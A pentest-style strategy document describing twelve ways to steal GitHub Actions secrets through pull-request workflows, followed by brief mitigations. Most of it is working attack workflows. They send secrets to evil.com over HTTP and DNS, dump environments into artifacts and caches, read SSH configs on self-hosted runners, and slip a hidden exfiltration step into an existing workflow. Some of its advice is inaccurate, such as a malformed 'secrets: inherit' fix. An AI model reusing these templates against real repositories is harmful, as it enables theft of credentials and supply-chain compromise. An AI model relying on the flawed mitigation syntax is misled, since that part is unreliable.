# GitHub Actions Secrets Exfiltration Research Strategy

## Target Repository
- **Owner**: Emmanuel
- **Pentester**: Emmanuel
- **Authorization**: Owner has explicitly authorized security testing on this repository

## Goal
Identify and demonstrate all possible methods to exfiltrate GitHub Actions secrets through Pull Request workflows.

## Threat Model
A malicious contributor (or compromised account) creates a Pull Request with the intent to exfiltrate repository secrets.

---

## Attack Vector 1: Direct Secret Printing to Logs

### Method
Create a workflow that prints secret values directly to GitHub Actions logs.

### Attack Workflow Template
```yaml
name: Malicious Secrets Printer
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate all secrets
        run: |
          echo "STEALING SECRETS"
          echo "MY_SECRET=${{ secrets.MY_SECRET }}"
          echo "API_TOKEN=${{ secrets.API_TOKEN }}"
          echo "DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}"
          env | sort
```

### Why It Works
- GitHub Actions logs may contain secret values if not properly masked
- Masking can be bypassed in various ways
- Logs are visible to PR creator

### Bypass Techniques
- Base64 encoding secrets before printing
- Splitting secrets into multiple echo statements
- Using variable expansion tricks

---

## Attack Vector 2: HTTP Exfiltration to Attacker-Controlled Server

### Method
Send secrets directly to an external endpoint controlled by the attacker.

### Attack Workflow Template
```yaml
name: Malicious HTTP Exfiltration
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate via curl
        run: |
          curl -X POST https://evil.com/steal \
            -d "repo=$GITHUB_REPOSITORY" \
            -d "secret1=${{ secrets.MY_SECRET }}" \
            -d "secret2=${{ secrets.API_TOKEN }}" \
            -d "all_env=$(env | base64 -w 0)"

      - name: Exfiltrate via wget
        run: |
          wget --post-data="token=${{ secrets.DEPLOY_KEY }}" \
            https://evil.com/collect

      - name: Exfiltrate via Python
        run: |
          python3 << 'EOF'
          import os
          import requests
          data = {
            'repo': os.environ['GITHUB_REPOSITORY'],
            'env': dict(os.environ),
            'extracted_secrets': {
              'MY_SECRET': '${{ secrets.MY_SECRET }}',
              'API_TOKEN': '${{ secrets.API_TOKEN }}'
            }
          }
          requests.post('https://evil.com/api/exfiltrate', json=data)
          EOF
```

### Why It Works
- Outbound network access is typically available
- Attacker can receive secret values via HTTP POST
- No visible evidence in GitHub logs (unless server is monitored)

### Countermeasures
- GitHub secret masking in logs
- Network restrictions (allow only specific domains)

---

## Attack Vector 3: DNS Exfiltration (Covert Channel)

### Method
Exfiltrate secrets through DNS queries, bypassing most network restrictions.

### Attack Workflow Template
```yaml
name: DNS Exfiltration
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate via DNS
        run: |
          SECRET="${{ secrets.MY_SECRET }}"
          # Split secret into chunks for DNS
          for i in $(seq 0 10 $((${#SECRET} - 1))); do
            CHUNK="${SECRET:$i:10}"
            nslookup "$CHUNK.stealer.evil.com"
            sleep 1
          done

      - name: Base64 DNS exfiltration
        run: |
          ENCODED=$(echo "${{ secrets.API_TOKEN }}" | base64 -w 0 | tr '+/=' '-_~')
          nslookup "$ENCODED.exfil.evil.com"
```

### Why It Works
- DNS is rarely blocked in CI/CD environments
- No visible HTTP traffic
- Can bypass egress filtering

---

## Attack Vector 4: Environment Variable Dumping

### Method
Capture all environment variables including secrets.

### Attack Workflow Template
```yaml
name: Environment Dump
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Dump all environment variables
        run: |
          env | sort > /tmp/env_dump.txt
          cat /tmp/env_dump.txt

      - name: Save to artifact
        uses: actions/upload-artifact@v4
        with:
          name: environment-secrets
          path: /tmp/env_dump.txt

      - name: Dump specific GitHub context
        run: |
          echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
          echo "GITHUB_REF: $GITHUB_REF"
          echo "GITHUB_ACTOR: $GITHUB_ACTOR"
```

### Why It Works
- GitHub Actions injects secrets as environment variables
- All secrets are available in `secrets.*` namespace
- Artifacts can contain secret data

---

## Attack Vector 5: GitHub Context Injection

### Method
Extract information from GitHub context and combine with secrets.

### Attack Workflow Template
```yaml
name: Context Injection
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Dump GitHub context
        run: |
          echo "Context:"
          echo '${{ toJson(github) }}'

      - name: Extract PR details with secrets
        run: |
          echo "PR from: $GITHUB_ACTOR"
          echo "PR number: ${{ github.event.pull_request.number }}"
          echo "Secret attached: ${{ secrets.MY_SECRET }}"
```

### Why It Works
- GitHub context contains metadata about repository
- Can correlate secrets with repo details
- Useful for targeting specific repositories

---

## Attack Vector 6: Code Injection via Action Parameters

### Method
Inject malicious code into action parameters that use secrets.

### Attack Workflow Template
```yaml
name: Parameter Injection
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Malicious action with secret
        uses: actions/checkout@v4
        with:
          # Inject secret into token parameter
          token: ${{ secrets.MY_SECRET }}

      - name: Custom action exfiltration
        uses: some-action@v1
        with:
          api-key: ${{ secrets.API_TOKEN }}
          # Try to pass command injection
          url: "https://api.evil.com/steal?token=${{ secrets.API_TOKEN }}"
```

### Why It Works
- Actions may log parameters
- Some actions execute parameters in unsafe ways
- Third-party actions may have vulnerabilities

---

## Attack Vector 7: Secret Enumeration via Workflow Disassembly

### Method
Analyze existing workflows to discover secret names, then target them.

### Attack Workflow Template
```yaml
name: Secret Discovery
on:
  pull_request:

jobs:
  discover-and-steal:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Find secret references
        run: |
          grep -r "secrets\." .github/workflows/ > secret_names.txt
          cat secret_names.txt

      - name: Attempt common secret names
        run: |
          COMMON_SECRETS=(
            "API_KEY"
            "API_TOKEN"
            "DEPLOY_KEY"
            "SECRET_KEY"
            "PASSWORD"
            "DATABASE_URL"
            "AWS_ACCESS_KEY_ID"
            "AWS_SECRET_ACCESS_KEY"
            "GITHUB_TOKEN"
            "NPM_TOKEN"
            "PYPI_TOKEN"
          )

          for secret_name in "${COMMON_SECRETS[@]}"; do
            echo "Trying: $secret_name"
            echo "Value: $(printenv $secret_name)"
          done
```

### Why It Works
- Workflow files contain secret references
- Can enumerate likely secret names
- Brute force common secret patterns

---

## Attack Vector 8: Composite Action Hijacking

### Method
Modify or create composite actions that exfiltrate secrets.

### Attack Workflow Template
```yaml
# .github/workflows/hijack.yml
name: Composite Action Hijack
on:
  pull_request:

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Use malicious composite action
        uses: ./.github/actions/malicious-action
        with:
          secret-to-steal: ${{ secrets.MY_SECRET }}

# .github/actions/malicious-action/action.yml
name: 'Malicious Action'
description: 'Steals secrets'
runs:
  using: 'composite'
  steps:
    - shell: bash
      run: |
        echo "Secret: ${{ inputs.secret-to-steal }}"
        curl -X POST https://evil.com/steal -d "secret=${{ inputs.secret-to-steal }}"
```

### Why It Works
- Composite actions execute with workflow permissions
- Can receive secrets as inputs
- Actions run in same context as workflow

---

## Attack Vector 9: Workflow Reuse Abuse

### Method
Exploit reusable workflows with secret inheritance.

### Attack Workflow Template
```yaml
name: Reuse Abuse
on:
  pull_request:

jobs:
  steal-secrets:
    uses: ./.github/workflows/target-workflow.yml
    secrets: inherit  # Inherit ALL repository secrets

# .github/workflows/target-workflow.yml
on:
  workflow_call:
    secrets:
      MY_SECRET:
        required: true
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate inherited secrets
        run: |
          echo "Secret: ${{ secrets.MY_SECRET }}"
          curl -X POST https://evil.com/steal -d "secret=${{ secrets.MY_SECRET }}"
```

### Why It Works
- `secrets: inherit` passes all secrets to reusable workflow
- Reusable workflow may be malicious
- Can bypass branch protection if reusable workflow is in same repo

---

## Attack Vector 10: Cache Poisoning for Persistence

### Method
Store exfiltrated secrets in cache for later access.

### Attack Workflow Template
```yaml
name: Cache Poisoning
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate and cache
        run: |
          mkdir -p cache_dir
          echo "${{ secrets.MY_SECRET }}" > cache_dir/stolen.txt
          echo "${{ secrets.API_TOKEN }}" >> cache_dir/stolen.txt
          env >> cache_dir/environment.txt

      - name: Save to cache
        uses: actions/cache@v4
        with:
          path: cache_dir
          key: stolen-secrets-${{ github.sha }}

      - name: Restore in future runs
        uses: actions/cache@v4
        with:
          path: cache_dir
          key: stolen-secrets-${{ github.sha }}
```

### Why It Works
- Caches persist across workflow runs
- Can store secrets for later retrieval
- May bypass some security checks

---

## Attack Vector 11: Self-Hosted Runner Exploitation

### Method
If the repo uses self-hosted runners, exfiltrate additional data.

### Attack Workflow Template
```yaml
name: Self-Hosted Exploitation
on:
  pull_request:

jobs:
  steal-secrets:
    runs-on: self-hosted
    steps:
      - name: List runner environment
        run: |
          whoami
          hostname
          env | sort

      - name: Scan for additional secrets
        run: |
          find /home -name "*.env" -o -name ".aws" 2>/dev/null
          cat ~/.ssh/config 2>/dev/null || true

      - name: Exfiltrate GitHub secrets
        run: |
          curl -X POST https://evil.com/steal \
            -d "github_secret=${{ secrets.MY_SECRET }}" \
            -d "runner_info=$(hostname -I)"
```

### Why It Works
- Self-hosted runners may have additional credentials
- Can access runner's filesystem
- May have access to other secrets on the runner

---

## Attack Vector 12: PR Workflow Tampering (The Attack Method)

### The Ultimate Attack: Modify Existing Workflows

Instead of creating new workflows, modify existing ones to exfiltrate secrets.

### Attack Workflow Template
```yaml
# Modify .github/workflows/test.yml
name: PR Test
on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo Hello
        run: echo "Hello"

      - name: [ADDED BY ATTACKER] Exfiltrate secrets
        if: always()  # Run even if previous steps fail
        run: |
          curl -X POST https://evil.com/exfil \
            -d "repo=$GITHUB_REPOSITORY" \
            -d "all_secrets=$(env | grep -E '^SECRET_|^API_|^TOKEN_' | base64 -w 0)"
```

### Why This Is Most Dangerous
- Less suspicious than new workflow files
- Runs in legitimate workflow context
- May bypass reviews if small changes
- Harder to detect in large PRs

---

## Testing Methodology

### Phase 1: Reconnaissance
1. Examine existing workflows for secret references
2. Identify which workflows run on `pull_request`
3. Check for `secrets: inherit` usage
4. Look for third-party actions that may be vulnerable

### Phase 2: Create Test PR
1. Create a new branch
2. Add malicious workflow file(s)
3. Open PR targeting main branch
4. Monitor workflow run logs

### Phase 3: Collect Evidence
1. Check workflow logs for secret exposure
2. Monitor external endpoints for exfiltration attempts
3. Review artifacts for secret data
4. Verify DNS exfiltration queries

### Phase 4: Documentation
1. Document all successful attack vectors
2. Identify which secrets were exposed
3. Create recommendations for mitigation
4. Test remediations

---

## Mitigation Strategies

### 1. Restrict Workflow Permissions
```yaml
jobs:
  test:
    permissions:
      contents: read
```

### 2. Disable Secret Inheritance for PRs
```yaml
on:
  pull_request:
    types: [opened, synchronize]
    secrets: inherit  # REMOVE THIS
```

### 3. Use Required Checks and Branch Protection
- Require PR reviews before merging
- Require status checks to pass
- Restrict who can push to protected branches

### 4. Implement Workflow Restrictions
- Limit which workflows can run on PRs
- Use `if: github.repository == 'your-org/repo'` checks
- Require environment protection rules

### 5. Monitor and Alert
- Set up GitHub Advanced Security scanning
- Monitor for suspicious workflow creations
- Alert on exfiltration attempts
- Review all workflow changes

### 6. Use Dependabot and CodeQL
- Enable automated security scanning
- Scan for secrets in code
- Detect workflow injection patterns

### 7. Network Egress Controls
- Block non-essential outbound domains
- Use private networks for runners
- Implement DNS filtering

### 8. Secret Rotation
- Regularly rotate all secrets
- Use short-lived tokens
- Implement secret versioning

---

## Testing Checklist

For your repository, test each attack vector:

- [ ] Direct secret printing to logs
- [ ] HTTP exfiltration to external endpoint
- [ ] DNS exfiltration via subdomains
- [ ] Environment variable dumping
- [ ] GitHub context extraction
- [ ] Parameter injection in actions
- [ ] Secret enumeration from workflows
- [ ] Composite action hijacking
- [ ] Reusable workflow abuse
- [ ] Cache poisoning
- [ ] Self-hosted runner exploitation (if applicable)
- [ ] Existing workflow modification

---

## Safety Notes

1. Only test on repositories you own or have explicit authorization to test
2. Use dummy/test secrets in your repository
3. Monitor your external endpoint for test exfiltration
4. Document all findings responsibly
5. Report vulnerabilities to repository owners if testing third-party repos
6. Do not publish stolen secrets from real repositories

---

## Conclusion

This strategy demonstrates multiple attack vectors for exfiltrating GitHub Actions secrets through Pull Request workflows. The most dangerous vector is modifying existing workflows, as it's harder to detect and may bypass security reviews.

**Key Takeaways:**
- Never allow `secrets: inherit` on PR-triggered workflows
- Restrict workflow permissions to minimum necessary
- Require thorough code reviews for workflow changes
- Monitor for suspicious workflow activity
- Use GitHub Advanced Security for secret scanning

---

*This research document is for educational and authorized security testing purposes only.*
